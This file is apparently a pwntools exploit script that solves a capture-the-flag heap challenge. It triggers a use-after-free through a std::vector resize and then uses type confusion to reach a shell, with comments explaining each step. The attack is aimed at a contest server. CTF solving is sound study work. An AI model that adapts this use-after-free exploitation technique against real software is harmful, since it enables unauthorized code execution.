#!/usr/bin/env python3

from pwn import *

the_binary = "./patch"
context.binary = the_binary
elf = context.binary

context.terminal = ["tmux", "splitw", "-h"]

if args.REMOTE:
    io = remote("lostark2.sstf.site", 1337)
elif args.STRACE:
    io = process(["strace", "-o" ,"trace.txt", the_binary])
else:
    io = process(the_binary)

if args.GDB:
    gdb.attach(io, f"""
        file {the_binary}
        continue
    """)

def menu(choice):
    io.sendlineafter("pick: ", str(choice))
index = menu

class CharacterType:
    reaper = 1
    bard = 2
    warlord = 3
    lupeon = 7

def create(name, kind):
    menu(1)
    menu(kind)

    if kind != CharacterType.lupeon:
        io.sendlineafter("name: ", name)

def delete(idx):
    menu(2)
    index(idx)

def list_():
    menu(3)

def choose(idx):
    menu(4)
    index(idx)

def set_skill():
    menu(5)

def use_skill():
    menu(6)

create("lupeon0", kind=CharacterType.lupeon)
create("lupeon1", kind=CharacterType.lupeon)
choose(1)

# Cause std::vector resize.
create("lupeon2", kind=CharacterType.lupeon)

# Now, there are two shared_ptrs pointing to lupeon1. Changing the the
# selected character will cause the underlying Lupeon to be freed, so v[1]
# will now point to a freed Lupeon.
choose(0)

# Type confusion with Reaper allows us to call Lupeon's gift auto-shell.
create("reaper1", kind=CharacterType.reaper)
choose(1)
use_skill()

io.interactive()
